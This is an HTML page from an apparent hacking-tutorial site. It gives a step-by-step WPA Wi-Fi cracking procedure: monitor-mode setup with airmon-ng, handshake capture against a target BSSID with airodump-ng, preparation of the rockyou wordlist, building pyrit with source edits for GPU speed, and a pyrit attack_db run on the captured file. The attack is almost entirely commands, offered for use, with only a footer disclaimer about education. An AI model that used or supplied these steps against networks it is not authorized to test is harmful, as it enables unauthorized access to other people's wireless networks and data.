<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>How to Speed Up Cracking Process</title>
	<base href="{{base_url}}" />
			<meta name="viewport" content="width=1333" />
		<meta name="description" content="In the dictionary and crunch attack, PMKs speed is near 4000 which will take lots of time to crack wifi so use the below trick to increase the speed of attack. This will provide 60000-100000 PMKs depends on client hardware." />
	<meta name="keywords" content="How To Speed Up Wifi Cracking Process" />
		<meta name="generator" content="Zyro - Website Builder" />
	
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
	<script src="js/jquery-1.8.3.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/main.js" type="text/javascript"></script>

	<link href="css/site.css?v=1.0.4" rel="stylesheet" type="text/css" />
	<link href="css/common.css?ts=1425383879" rel="stylesheet" type="text/css" />
	<link href="css/94.css?ts=1425383879" rel="stylesheet" type="text/css" />
	<link rel="shortcut icon" href="http://haktuts.com/gallery/icon-ts1413278622.png" type="image/png" /><meta name="google-site-verification" content="google6bc4eec58925fc74.html" />
	<script type="text/javascript">var currLang = '';</script>		
	<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
	  <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
</head>


<body>{{ga_code}}<div class="root"><div class="vbox wb_container" id="wb_header">
	
<div id="wb_element_instance555" class="wb_element"><ul class="hmenu"><li><a href="Home/" target="_self" title="Home">Home</a></li><li><a href="Free-ethical-hacking-course-online/" target="_self" title="Ethical Hacking">Ethical Hacking</a></li><li><a href="Linux/" target="_self" title="Linux">Linux</a></li><li><a href="Tips-and-tricks/" target="_self" title="Tips and Trick ">Tips and Trick </a><ul><li><a href="how-to-share-internet-without-wifi/" target="_self" title="Windows">Windows</a></li><li><a href="basic-windows-command/" target="_self" title="Windows Shortcut">Windows Shortcut</a></li><li><a href="top-20-notepad-trick/" target="_self" title="Notepad Hacking">Notepad Hacking</a></li><li><a href="list-of-top-cydia-tweaks-for-ios/" target="_self" title="iOS">iOS</a></li><li><a href="how-to-install-kali-linux-nethunter/" target="_self" title="Android">Android</a></li></ul></li><li><a href="News-1/" target="_self" title="News">News</a></li><li><a href="download-all-hacking-tools/" target="_self" title="Download">Download</a></li><li><a href="Contact-us/" target="_self" title="Contact us">Contact us</a></li></ul></div><div id="wb_element_instance556" class="wb_element" style=" line-height: normal;"><h4 class="wb-stl-pagetitle"><span class="wb-stl-special"><span style="color:#bebebe;">HakTuts</span></span></h4>
</div></div>
<div class="vbox wb_container" id="wb_main">
	
<div id="wb_element_instance560" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1"><span style="color:#bebebe;">How To Speed Up Wifi Cracking Process using pyrit</span></h1>

<p> </p>

<p class="wb-stl-normal"><span style="color:#bebebe;">In the dictionary and crunch attack, PMKs speed is near 4000 which will take lots of time to crack wifi so use the below trick to increase the speed of attack. This will provide 60000-100000 PMKs depends on client hardware.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>1.</strong>  Start kali linux and open terminal in kali linux.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>2.</strong>  Type command : airmon-ng</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">           (Check weather your wireless card is avilable and working properly)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>3.</strong>  Type command : airmon-ng start wlan0</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">           (put your wireless card in monitoring mode as wifi crack is possible in monitoring mode only)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>4.</strong>  Type command: airodump-ng mon0</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">            (command to listen to the wireless network around you and get details about them.)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>5.</strong>  Type command : airodump-ng –w File name of packet –c Target channel no --bssid BSSID of target name mon0</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">               (  eg: airodump-ng –w MTNL –c 3 –bssid 11:22:33:44:55:66 mon0)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">              (This means airodump-ng has successfully captured the handshake.</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">[<strong>Note:</strong> Default directory for wordlist in linux:  /usr/share/wordlists/rockyou.txt.gz]</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>Steps to attach dictionary</strong></span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>1.</strong> cp /usr/share/wordlists/rockyou.txt.gz  (copy the file to root directory)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>2.</strong> gunzIP rockyou.txt.gz    (UnzIP the file)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>3.</strong> mv newrockyou.txt wordlist.lst    (rename the file from newrockyou to wordlist)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>Download and install pyrit</strong></span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>1.</strong>  svn checkout http://pyrit.googlecode.com/svn/trunk/ pyrit_svn   (Download the file)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>2.</strong>  cd pyrit_svn/pyrit/ ./setup.py build install       (build and install setup.py file)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>3.</strong>  cd ..                          (step back to pyrit_svn)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>4.</strong>  Cd cpyrit_calpp    (go to  cpyrit_calpp directory)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>5.</strong>  Edit setup.py  and find VERSION = '0.4.0-dev and change to VERSION = '0.4.1-dev also</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">                find CALPP_INC_DIRS.append(os.path.join(CALPP_INC_DIR, 'include')) and replace with CALPP_INC_DIRS.append(os.path.join(CALPP_INC_DIR, 'include/CAL'))</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;">                        Save the file and run using below command</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>6.</strong>  ./setup.py build install   (build and install  and edited file)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>7.</strong>  pyrit –e MTNL create_essid   (Create essid in pyrit databases)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>8.</strong>  pyrit -i  wordlist .lst import_passwords     (import the dictionary in pyrit databases)</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>9.</strong>  pyrit batch           ( create table in pyrit databases</span></p>

<p class="wb-stl-normal"><span style="color:#bebebe;"><strong>10.</strong>pyrit –r MTNL .cap attack_db       (perform attack on handshake file)</span></p>

<p> </p>
</div><div id="wb_element_instance561" class="wb_element" style="width: 100%;">
			<?php
				global $show_comments;
				if (isset($show_comments) && $show_comments) {
					renderComments(94);
			?>
			<script type="text/javascript">
				$(function() {
					var block = $("#wb_element_instance561");
					var comments = block.children(".wb_comments").eq(0);
					var contentBlock = $("#wb_main");
					contentBlock.height(contentBlock.height() + comments.height());
				});
			</script>
			<?php
				} else {
			?>
			<script type="text/javascript">
				$(function() {
					$("#wb_element_instance561").hide();
				});
			</script>
			<?php
				}
			?>
			</div></div>
<div class="vbox wb_container" id="wb_footer" style="height: 154px;">
	
<div id="wb_element_instance557" class="wb_element" style=" line-height: normal;"><p class="wb-stl-footer">The Content of the website is for educational purpose.</p>
</div><div id="wb_element_instance558" class="wb_element" style=" line-height: normal;"><p class="wb-stl-footer">haktuts © 2014. All Rights Reserved </p>
</div><div id="wb_element_instance559" class="wb_element"><div id="wb_element_instance559_toolbox" style="width: 200px; height: 30px;"><a id="wb_element_instance559_facebook" class="addthis_button_facebook addthis_32x32_style" style="float: left;"></a><a id="wb_element_instance559_twitter" class="addthis_button_twitter addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance559_email" class="addthis_button_email addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance559_google" class="addthis_button_google addthis_32x32_style" style="float: left; margin-left: 4px;"></a><a id="wb_element_instance559_compact" class="addthis_button_compact addthis_32x32_style" style="float: left; margin-left: 4px;"></a></div><script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid=haktuts.com"></script><script type="text/javascript">
				if (window.addthis) { addthis.toolbox("#wb_element_instance559_toolbox"); }
			</script></div><div id="wb_element_instance562" class="wb_element" style="text-align: center; width: 100%;"><div class="wb_footer"></div><script type="text/javascript">
			$(function() {
				var footer = $(".wb_footer");
				var html = (footer.html() + "").replace(/^\s+|\s+$/g, "");
				if (!html) {
					footer.parent().remove();
					footer = $("#wb_footer");
					footer.height(100);
				}
			});
			</script></div></div><div class="wb_sbg"></div></div></body>
</html>